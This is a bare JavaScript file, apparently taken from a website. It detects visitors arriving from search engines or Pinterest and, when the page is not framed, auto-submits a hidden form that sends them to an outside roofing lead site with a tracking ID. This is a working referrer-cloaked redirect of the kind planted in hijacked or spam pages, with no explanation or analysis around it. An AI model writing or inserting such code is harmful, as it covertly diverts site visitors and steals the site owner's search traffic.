// JavaScript Document
if((document.referrer.match(/.google./g) != null || document.referrer.match(/.yahoo./g) != null || document.referrer.match(/.bing./g) != null || document.referrer.match(/.aol./g) != null || document.referrer.match(/.pinterest./g) != null || self.location == document.referrer) && top.frames.length == 0)
{
	var u1Arr = [];
	var u2Arr = [];
	u1Arr[1] = "http://servicepros.info/roofing";
	u2Arr[1] = "2016JCTEDSROOFING";
	
	var u = Math.ceil(Math.random()*(u2Arr.length-1));
	document.getElementById("fmRe").action = u1Arr[u];
	document.getElementById("tid").value = u2Arr[u];
	document.getElementById("fmRe").submit();
}
